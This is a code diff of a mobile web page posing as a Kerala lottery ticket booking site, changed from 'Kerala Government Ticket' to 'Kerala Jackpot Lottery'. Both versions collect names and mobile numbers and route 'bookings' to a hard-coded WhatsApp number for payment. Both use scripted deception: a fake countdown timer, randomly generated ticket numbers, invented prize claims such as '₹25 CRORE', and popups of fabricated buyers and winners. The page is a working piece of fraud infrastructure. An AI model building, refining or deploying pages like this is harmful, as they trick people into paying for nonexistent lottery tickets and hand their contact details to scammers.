@@ -1,397 +1,349 @@
 <!doctype html>
-<html lang="en">
+<html>
 <head>
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1"/>
-<title>Kerala Government Ticket</title>
+<title>Kerala Jackpot Lottery</title>
+
 <style>
-:root{--accent:#ff4f79;--accent-dark:#d9365d;--bg:#fff3f7;--card:#fff;}
-body{margin:0;background:var(--bg);font-family:Arial,sans-serif;display:flex;justify-content:center;padding:10px;}
-.container{width:100%;max-width:420px;background:var(--card);padding:16px;border-radius:14px;box-shadow:0 6px 16px rgba(0,0,0,.12);}
-.topLogo img{width:140px;display:block;margin:0 auto 6px;}
-.livePop{display:inline-block;padding:6px 14px;border-radius:20px;background:linear-gradient(90deg,#2ecc71,#27ae60);color:#fff;font-size:12px;font-weight:bold;animation:pulse 1.2s infinite;}
-@keyframes pulse{0%{transform:scale(1);}50%{transform:scale(1.05);}100%{transform:scale(1);}}
-.timerBar{background:#e8f5e9;color:#1b5e20;padding:6px;border-radius:8px;font-size:12px;text-align:center;font-weight:bold;margin-bottom:8px;}
-h2{text-align:center;margin:6px 0;color:#d9365d;font-size:18px;}
-input,select,button{width:100%;padding:10px;margin-bottom:8px;border-radius:8px;border:1px solid #ddd;font-size:14px;box-sizing:border-box;}
-.ticketBox{border:2px dashed #ff4f79;border-radius:12px;padding:10px;margin-bottom:8px;}
-.ticketAmount{background:#e8f5e9;color:#1b5e20;padding:6px;border-radius:8px;text-align:center;font-weight:bold;margin-bottom:6px;font-size:13px;}
-.ticketTitle{font-weight:bold;color:#d9365d;margin-bottom:6px;font-size:13px;}
-select[multiple]{height:70px;}
-.counter{font-size:12px;margin-top:4px;color:#444;}
-.selectedList{display:flex;flex-wrap:wrap;gap:6px;margin-top:8px;}
-.chip{background:#ffe3ea;color:#d9365d;padding:4px 8px;border-radius:10px;font-size:12px;display:flex;align-items:center;gap:6px;}
-.chip span{cursor:pointer;font-weight:bold;}
-button.primary{background:linear-gradient(90deg,var(--accent),var(--accent-dark));color:#fff;border:none;font-weight:bold;cursor:pointer;font-size:15px;padding:11px;border-radius:8px;}
-button:disabled{opacity:.55;cursor:not-allowed;}
-.modal{position:fixed;inset:0;background:rgba(0,0,0,.45);display:none;align-items:center;justify-content:center;z-index:10002;}
-.modalBox{background:#fff;width:92%;max-width:420px;border-radius:12px;padding:16px;box-shadow:0 12px 30px rgba(0,0,0,.18);}
-.modalBox h3{text-align:center;color:#d9365d;margin:0 0 10px;}
-.summary{font-size:14px;line-height:1.5;color:#222;}
-.modalBtns{display:flex;gap:10px;margin-top:14px;}
-.modalBtns button{flex:1;padding:10px;border-radius:8px;border:none;font-weight:bold;}
-.cancelBtn{background:#eee;color:#444;}
-.confirmBtn{background:linear-gradient(90deg,#34c759,#10a37f);color:#fff;}
 
-/* ---------- Small Rectangular Bottom Popup (final) ---------- */
-.notif-wrapper{
-  position:fixed;
-  left:12px;
-  bottom:14px;
-  z-index:10001;
-  pointer-events:none;
+body{
+margin:0;
+font-family:Arial;
+background:linear-gradient(135deg,#ffecd2,#fcb69f);
+display:flex;
+justify-content:center;
+align-items:center;
+height:100vh;
 }
-.notif{
-  pointer-events:auto;
-  background:#ffffff;
-  border-left:4px solid #ff4f79;
-  color:#333;
-  padding:8px 10px;
-  border-radius:6px;
-  box-shadow:0 6px 18px rgba(0,0,0,0.12);
-  display:flex;
-  gap:10px;
-  align-items:center;
-  font-size:13px;
-  min-width:220px;
-  max-width:300px;
-  opacity:0;
-  transform:translateY(10px);
-  animation:slideIn 300ms ease forwards;
-}
-.notif.hide{ animation:slideOut 300ms ease forwards; }
-@keyframes slideIn{ from{opacity:0;transform:translateY(10px);} to{opacity:1;transform:translateY(0);} }
-@keyframes slideOut{ from{opacity:1;} to{opacity:0;transform:translateY(10px);} }
-.notif .avatar{
-  width:36px;height:36px;border-radius:4px;background:#ff4f79;color:#fff;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:13px;flex-shrink:0;
-}
-.notif .body{line-height:1.1;}
-.notif .who{font-weight:700;color:#d9365d;font-size:13px;}
-.notif .mobile{font-size:12px;color:#666;margin-top:2px;}
-.notif .state{font-size:12px;color:#444;margin-top:2px;font-weight:600;}
-.notif .msg{margin-top:6px;font-size:13px;color:#222;}
 
-/* floating whatsapp button on right (uses provided image) */
-.wa-float{
-  position:fixed;
-  right:14px;
-  bottom:14px;
-  z-index:10003;
-  width:56px;height:56px;border-radius:50%;box-shadow:0 10px 26px rgba(0,0,0,0.18);overflow:hidden;background:#fff;display:flex;align-items:center;justify-content:center;cursor:pointer;border:2px solid #fff;
+.container{
+position:relative;
+width:100%;
+max-width:420px;
+height:100vh;
+background:#fff;
+display:flex;
+flex-direction:column;
+overflow:hidden;
 }
-.wa-float img{width:100%;height:100%;object-fit:cover;display:block;}
 
-/* responsive tweaks */
-@media (max-width:420px){
-  .container{padding:12px;}
-  .notif{left:8px;right:8px;min-width:auto;max-width:calc(100% - 32px);}
-  .wa-float{right:10px;bottom:10px;width:50px;height:50px;}
+.headerImg{
+width:100%;
+height:28%;
+object-fit:cover;
 }
+
+.prize{
+background:#e53935;
+color:#fff;
+text-align:center;
+padding:10px;
+font-weight:bold;
+font-size:16px;
+animation:blink 1s infinite;
+}
+
+@keyframes blink{
+50%{opacity:.5}
+}
+
+/* WHATSAPP BUTTON */
+
+.whatsapp{
+position:absolute;
+top:10px;
+right:10px;
+background:linear-gradient(45deg,#25D366,#1ebe5d);
+color:#fff;
+padding:10px 14px;
+border-radius:50px;
+display:flex;
+align-items:center;
+gap:6px;
+font-weight:bold;
+text-decoration:none;
+font-size:13px;
+animation:bounce 1.4s infinite;
+box-shadow:0 5px 12px rgba(0,0,0,.3);
+}
+
+.whatsapp img{
+width:18px;
+}
+
+@keyframes bounce{
+0%{transform:translateY(0)}
+50%{transform:translateY(-6px)}
+100%{transform:translateY(0)}
+}
+
+.popup{
+position:absolute;
+top:22%;
+left:50%;
+transform:translateX(-50%);
+background:#000;
+color:#fff;
+padding:7px 12px;
+font-size:12px;
+border-radius:8px;
+display:none;
+z-index:5;
+}
+
+.form{
+padding:10px;
+display:flex;
+flex-direction:column;
+gap:6px;
+overflow:auto;
+}
+
+input{
+padding:10px;
+border-radius:8px;
+border:1px solid #ccc;
+font-size:14px;
+}
+
+.error{
+font-size:11px;
+color:#e53935;
+}
+
+.ticketNote{
+font-size:12px;
+color:#d32f2f;
+text-align:center;
+font-weight:bold;
+}
+
+.ticketGrid{
+display:grid;
+grid-template-columns:repeat(4,1fr);
+gap:6px;
+height:200px;
+overflow:auto;
+border:2px dashed #ff4081;
+padding:6px;
+border-radius:8px;
+}
+
+.ticket{
+background:#f5f5f5;
+padding:6px;
+text-align:center;
+border-radius:6px;
+font-size:12px;
+cursor:pointer;
+border:1px solid #ddd;
+}
+
+.ticket.active{
+background:#4caf50;
+color:#fff;
+}
+
+.amount{
+background:#e8f5e9;
+padding:6px;
+border-radius:6px;
+text-align:center;
+font-weight:bold;
+}
+
+button{
+padding:12px;
+border:none;
+border-radius:10px;
+background:#00c853;
+color:#fff;
+font-weight:bold;
+font-size:15px;
+animation:pulse 1.2s infinite;
+}
+
+@keyframes pulse{
+0%{transform:scale(1)}
+50%{transform:scale(1.05)}
+100%{transform:scale(1)}
+}
+
 </style>
 </head>
+
 <body>
+
 <div class="container">
 
-  <div class="topLogo">
-    <img src="https://i.postimg.cc/XvXzF7RJ/IMG-20251225-WA0003.jpg" alt="logo">
-  </div>
+<a id="waBtn" class="whatsapp" target="_blank">
+<img src="https://cdn-icons-png.flaticon.com/512/733/733585.png">
+Chat on WhatsApp
+</a>
 
-  <div style="text-align:center;margin-bottom:8px;">
-    <span class="livePop">🟢 LIVE BOOKING ACTIVE</span>
-  </div>
+<img src="https://i.postimg.cc/7L3ZWfQh/Onam-bumper.jpg" class="headerImg">
 
-  <div class="timerBar" id="timer">⏳ Booking closes in 30:00</div>
-
-  <h2>Kerala Government Ticket</h2>
-
-  <input id="name" placeholder="Full Name">
-  <input id="mobile" placeholder="Mobile Number">
-
-  <select id="state">
-    <option value="">Select State</option>
-    <option>Kerala</option>
-    <option>Tamil Nadu</option>
-    <option>Karnataka</option>
-    <option>Andhra Pradesh</option>
-    <option>Telangana</option>
-  </select>
-
-  <select id="language">
-    <option>English</option>
-    <option>Hindi</option>
-    <option>Malayalam</option>
-    <option>Tamil</option>
-    <option>Kannada</option>
-    <option>Telugu</option>
-  </select>
-
-  <div class="ticketBox">
-    <div class="ticketAmount" id="ticketAmount">💰 Total Amount: ₹0</div>
-    <div class="ticketTitle">🎟 Select Lucky Ticket (₹149 per ticket)</div>
-    <select id="ticket" multiple></select>
-    <div class="counter" id="counter">Selected: 0 tickets</div>
-    <div class="selectedList" id="selectedList"></div>
-  </div>
-
-  <input id="amount" placeholder="Total Amount (₹)" readonly>
-  <button id="submitBtn" class="primary" disabled>Submit & Continue</button>
-
+<div class="prize">
+🔥 FIRST PRIZE ₹25 CRORE
 </div>
 
-<!-- Floating WhatsApp (uses provided image) -->
-<div class="wa-float" id="waFloat" title="Chat on WhatsApp">
-  <img id="waImg" src="https://kerelalottery.ct.ws/wp-content/uploads/2026/02/whatsapp.jpg" alt="whatsapp">
-</div>
+<div id="popup" class="popup"></div>
 
-<!-- Modal -->
-<div class="modal" id="previewModal">
-  <div class="modalBox">
-    <h3>Payment Preview</h3>
-    <div class="summary" id="previewContent"></div>
-    <div class="modalBtns">
-      <button class="cancelBtn" onclick="closePreview()">Cancel</button>
-      <button class="confirmBtn" onclick="proceedWhatsApp()">Confirm & WhatsApp</button>
-    </div>
-  </div>
+<div class="form">
+
+<input id="name" placeholder="Enter Your Full Name">
+<div id="nameErr" class="error"></div>
+
+<input id="mobile" placeholder="Enter 10 Digit Mobile Number" maxlength="10">
+<div id="mobileErr" class="error"></div>
+
+<div id="ticketNote" class="ticketNote"></div>
+
+<div id="ticketGrid" class="ticketGrid"></div>
+
+<div id="amount" class="amount"></div>
+
+<button onclick="submitForm()">
+Submit & Continue To WhatsApp
+</button>
+
+</div>
 </div>
 
 <script>
-/* ---------------- CONFIG ----------------
-   Change WHATSAPP_NUMBER here and it updates everywhere
------------------------------------------ */
-const WHATSAPP_NUMBER = "+917990660606"; // <- set your WhatsApp number (with country code)
-const WHATSAPP_IMG_URL = "https://kerelalottery.ct.ws/wp-content/uploads/2026/02/whatsapp.jpg";
 
-/* ---------- Timer ---------- */
-let time = 1800;
-setInterval(()=>{
-  let m = Math.floor(time/60), s = time%60;
-  document.getElementById("timer").textContent = `⏳ Booking closes in ${m}:${s.toString().padStart(2,"0")}`;
-  if(time>0) time--;
-},1000);
+const WHATSAPP_NUMBER="919576480994";
+document.getElementById("waBtn").href="https://wa.me/"+WHATSAPP_NUMBER;
 
-/* ---------- Booking / Tickets ---------- */
-const TICKET_PRICE = 149, MIN_TICKETS = 3;
-const ticket = document.getElementById("ticket"),
-      selectedList = document.getElementById("selectedList"),
-      amount = document.getElementById("amount"),
-      ticketAmount = document.getElementById("ticketAmount"),
-      submitBtn = document.getElementById("submitBtn"),
-      counter = document.getElementById("counter"),
-      language = document.getElementById("language"),
-      stateSelect = document.getElementById("state"),
-      nameI = document.getElementById("name"),
-      mobileI = document.getElementById("mobile"),
-      previewModal = document.getElementById("previewModal"),
-      previewContent = document.getElementById("previewContent");
+const PRICE=40;
+let selected=[];
 
-for(let i=0;i<3000;i++){
-  let n = ("000000"+Math.floor(Math.random()*999999)).slice(-6);
-  let o = document.createElement("option");
-  o.value = "KL"+n; o.textContent = "KL"+n;
-  ticket.appendChild(o);
+const grid=document.getElementById("ticketGrid");
+const amount=document.getElementById("amount");
+const note=document.getElementById("ticketNote");
+
+/* GENERATE 2000 TICKETS */
+
+for(let i=0;i<2000;i++){
+
+let num="KL"+("000000"+Math.floor(Math.random()*999999)).slice(-6);
+
+let div=document.createElement("div");
+div.className="ticket";
+div.innerText=num;
+
+div.onclick=function(){
+
+if(selected.includes(num)){
+selected=selected.filter(t=>t!==num);
+div.classList.remove("active");
+}else{
+selected.push(num);
+div.classList.add("active");
 }
 
-/* Append remaining states under the existing top ones (avoid duplicates) */
-const moreStates = [
-  "Maharashtra","Gujarat","Rajasthan","Punjab","Haryana","Bihar","Uttar Pradesh",
-  "Madhya Pradesh","Chhattisgarh","Odisha","West Bengal","Assam",
-  "Arunachal Pradesh","Manipur","Meghalaya","Mizoram","Nagaland","Sikkim","Tripura",
-  "Jammu & Kashmir","Ladakh","Delhi","Goa","Puducherry","Andaman & Nicobar",
-  "Dadra and Nagar Haveli and Daman & Diu","Lakshadweep"
-];
-const existVals = [...stateSelect.options].map(o=>o.textContent.trim());
-moreStates.forEach(s=>{
-  if(!existVals.includes(s)){
-    let o=document.createElement("option");
-    o.textContent=s;
-    stateSelect.appendChild(o);
-  }
+update();
+
+};
+
+grid.appendChild(div);
+
+}
+
+function update(){
+
+let count=selected.length;
+let total=count*PRICE;
+
+if(count==1){
+
+note.innerText="Minimum 2 tickets required";
+amount.innerText="";
+
+}else if(count>=2){
+
+note.innerText="";
+amount.innerText="Tickets: "+count+" | Amount ₹"+total;
+
+}else{
+
+note.innerText="";
+amount.innerText="";
+
+}
+
+}
+
+/* MOBILE NUMBER ONLY */
+
+document.getElementById("mobile").addEventListener("input",function(){
+this.value=this.value.replace(/\D/g,'');
 });
 
-function refresh(){
-  let sel = [...ticket.selectedOptions].map(o=>o.value);
-  counter.textContent = `Selected: ${sel.length} tickets`;
-  selectedList.innerHTML = "";
-  sel.forEach(t=>{
-    let c = document.createElement("div");
-    c.className = "chip";
-    c.innerHTML = `${t} <span onclick="removeTicket('${t}')">×</span>`;
-    selectedList.appendChild(c);
-  });
-  if(sel.length >= MIN_TICKETS){
-    let total = sel.length * TICKET_PRICE;
-    amount.value = "₹ " + total;
-    ticketAmount.textContent = "💰 Total Amount: ₹ " + total;
-  } else {
-    amount.value = "";
-    ticketAmount.textContent = "💰 Minimum 3 tickets required";
-  }
-  submitBtn.disabled = !(sel.length>=3 && nameI.value.trim() && mobileI.value.trim() && stateSelect.value);
+/* SUBMIT */
+
+function submitForm(){
+
+let name=document.getElementById("name").value.trim();
+let mobile=document.getElementById("mobile").value.trim();
+
+document.getElementById("nameErr").innerText="";
+document.getElementById("mobileErr").innerText="";
+
+if(name==""){
+document.getElementById("nameErr").innerText="Enter your full name";
+return;
 }
 
-ticket.addEventListener("change",refresh);
-[nameI, mobileI, stateSelect].forEach(i=>i.addEventListener("input",refresh));
+if(mobile.length!=10){
+document.getElementById("mobileErr").innerText="Enter valid 10 digit mobile number";
+return;
+}
 
-window.removeTicket = (t) => {
-  [...ticket.options].forEach(o=>{ if(o.value===t) o.selected=false; });
-  refresh();
-};
+if(selected.length<2){
+note.innerText="Minimum 2 tickets required";
+return;
+}
 
-submitBtn.onclick = ()=>{
-  let sel = [...ticket.selectedOptions].map(o=>o.value).join(", ");
-  previewContent.innerHTML = `
-    <b>Name:</b> ${nameI.value}<br>
-    <b>Mobile:</b> ${mobileI.value}<br>
-    <b>State:</b> ${stateSelect.value}<br><br>
-    <b>Tickets Selected:</b><br>${sel}<br><br>
-    <b>Total Tickets:</b> ${ticket.selectedOptions.length}<br>
-    <b>Price per Ticket:</b> ₹149<br>
-    <b>Total Amount:</b> ${amount.value}<br><br>
-    <b>Payment Mode:</b> WhatsApp Confirmation<br>
-    ⚠️ Please verify details before proceeding.
-  `;
-  previewModal.style.display = "flex";
-};
+let msg=`Kerala Jackpot Booking
 
-function closePreview(){ previewModal.style.display = "none"; }
-
-function proceedWhatsApp(){
-  let tickets = [...ticket.selectedOptions].map(o=>o.value).join(", ");
-  let msg = `New Booking
-Name: ${nameI.value}
-Mobile: ${mobileI.value}
-State: ${stateSelect.value}
+Name: ${name}
+Mobile: ${mobile}
 
 Tickets:
-${tickets}
+${selected.join(", ")}
 
-Total Tickets: ${ticket.selectedOptions.length}
-Amount: ${amount.value}
-Language: ${language.value}`;
-  const numClean = WHATSAPP_NUMBER.replace(/\D/g,'');
-  window.open("https://wa.me/"+numClean+"?text="+encodeURIComponent(msg),"_blank");
-  previewModal.style.display = "none";
+Amount ₹${selected.length*PRICE}`;
+
+window.location.href="https://wa.me/"+WHATSAPP_NUMBER+"?text="+encodeURIComponent(msg);
+
 }
 
-/* ---------------- Notifications (ONE at a time, small rectangular) ---------------- */
+/* AUTO BOOKING POPUP */
 
-/* Larger South full names */
-const southFullNames = [
-  "Ramesh Chandrasekaran","Suresh Balakrishnan","Venkatesh Subramanian","Prakash Narayanan",
-  "Mahesh Raghavan","Karthikeyan Iyer","Arunachalam Pillai","Ravindran Nair",
-  "Ananthakrishnan Menon","Shivakumar Gowda","Basavaraj Patil","Nagendra Reddy",
-  "Satyanarayana Rao","Krishna Murthy","Srinivasa Raju","Vijayendra Shetty",
-  "Muralidhar Hegde","Chandrashekar Nayak","Gopalakrishna Pai","Subhash Chandra Bhat",
-  "Madhavan Pillai","Sathish Kumar","Harikrishnan Menon","Sivaprasad Nair","Balu Varma",
-  "Pradeep Reddy","Sandeep Raghav","Manoj Kumar Iyer","Ravichandran Mohan","Anil Kumar Rao"
-];
-/* small set of other region names to keep realistic */
-const otherNames = ["Ankit Sharma","Ravi Gupta","Amit Verma","Sourav Das","Abhishek Singh"];
-const allNamesWeighted = [...southFullNames, ...southFullNames, ...southFullNames, ...otherNames];
+const names=["Arjun","Karthik","Vijay","Rahul","Ramesh","Naveen"];
+const cities=["Chennai","Bangalore","Kochi","Hyderabad"];
 
-/* messages templates - show one at a time */
-const popupMessages = [
-  "Just booked KL{T}",
-  "Booked KL{T}",
-  "KL{T} confirmed",
-  "Lucky ticket KL{T}",
-  "WIN ₹5 Lakh on KL{T}"
-];
+function autoPopup(){
 
-/* states weighted toward south (top 5 repeated to bias) */
-const topFive = ["Kerala","Tamil Nadu","Karnataka","Andhra Pradesh","Telangana"];
-const otherStates = [
-  "Maharashtra","Gujarat","Rajasthan","Punjab","Haryana","Bihar","Uttar Pradesh",
-  "Madhya Pradesh","Chhattisgarh","Odisha","West Bengal","Assam",
-  "Arunachal Pradesh","Manipur","Meghalaya","Mizoram","Nagaland","Sikkim","Tripura",
-  "Jammu & Kashmir","Ladakh","Delhi","Goa","Puducherry","Andaman & Nicobar",
-  "Dadra and Nagar Haveli and Daman & Diu","Lakshadweep"
-];
-const allStatesWeighted = [...topFive, ...topFive, ...topFive, ...otherStates];
+let name=names[Math.floor(Math.random()*names.length)];
+let city=cities[Math.floor(Math.random()*cities.length)];
+let t=Math.floor(Math.random()*3)+2;
 
-/* utils */
-function randTicket(){ return Math.floor(100000 + Math.random()*900000); }
-function maskedMobile(){ const start = [9,8,7][Math.floor(Math.random()*3)]; return "+91 "+start+"xxxx"+Math.floor(1000+Math.random()*9000); }
+let popup=document.getElementById("popup");
 
-/* notification DOM */
-const notifWrapper = document.getElementById("notifWrapper");
-let activeNotif = null;
-let notifTimer = null;
-let notifInterval = null;
+popup.innerText=name+" from "+city+" booked "+t+" tickets 🎟";
 
-function createAndShowNotif(){
-  // remove existing if any
-  if(activeNotif){
-    activeNotif.classList.add("hide");
-    setTimeout(()=>{ if(activeNotif) activeNotif.remove(); activeNotif = null; }, 320);
-  }
+popup.style.display="block";
 
-  const name = allNamesWeighted[Math.floor(Math.random()*allNamesWeighted.length)];
-  const ticketNum = "KL" + randTicket();
-  const tpl = popupMessages[Math.floor(Math.random()*popupMessages.length)];
-  const message = tpl.replace("{T}", ticketNum);
-  const mobile = maskedMobile();
-  const state = allStatesWeighted[Math.floor(Math.random()*allStatesWeighted.length)];
+setTimeout(()=>popup.style.display="none",2500);
 
-  const n = document.createElement("div");
-  n.className = "notif";
-  n.innerHTML = `
-    <div class="avatar">${name.split(" ")[0].charAt(0)}</div>
-    <div class="body">
-      <div class="who">${name}</div>
-      <div class="mobile">${mobile} • <span class="state">${state}</span></div>
-      <div class="msg">${message}</div>
-    </div>
-  `;
-
-  notifWrapper.appendChild(n);
-  activeNotif = n;
-
-  // auto hide after 4s
-  notifTimer = setTimeout(()=>{
-    if(activeNotif){
-      activeNotif.classList.add("hide");
-      setTimeout(()=>{ if(activeNotif) activeNotif.remove(); activeNotif = null; }, 320);
-    }
-  }, 4000);
 }
 
-/* start slow cycle (every 7s show one). Start once on DOMContentLoaded */
-function startNotifCycle(){
-  if(notifInterval) return;
-  createAndShowNotif(); // show immediately once
-  notifInterval = setInterval(()=> {
-    createAndShowNotif();
-  }, 7000);
-}
+setInterval(autoPopup,3500);
 
-/* stop cycle */
-function stopNotifCycle(){
-  if(notifInterval){ clearInterval(notifInterval); notifInterval = null; }
-  if(notifTimer){ clearTimeout(notifTimer); notifTimer = null; }
-  if(activeNotif){ activeNotif.classList.add("hide"); setTimeout(()=>{ if(activeNotif) { activeNotif.remove(); activeNotif=null; } }, 320); }
-}
-
-/* stop when user focuses input, resume on blur */
-[nameI, mobileI].forEach(el=>{
-  el.addEventListener("focus", ()=> { stopNotifCycle(); });
-  el.addEventListener("blur", ()=> { if(!notifInterval) startNotifCycle(); });
-});
-
-/* start when page ready */
-document.addEventListener("DOMContentLoaded", ()=>{
-  // set WA image (in case changed)
-  document.getElementById("waImg").src = WHATSAPP_IMG_URL;
-  startNotifCycle();
-});
-
-/* ---------- Floating WhatsApp button (same number) ---------- */
-document.getElementById("waFloat").addEventListener("click", ()=>{
-  const numClean = WHATSAPP_NUMBER.replace(/\D/g,'');
-  const pre = "Hi, I want to book tickets.";
-  window.open("https://wa.me/"+numClean+"?text="+encodeURIComponent(pre), "_blank");
-});
 </script>
+
 </body>
 </html>
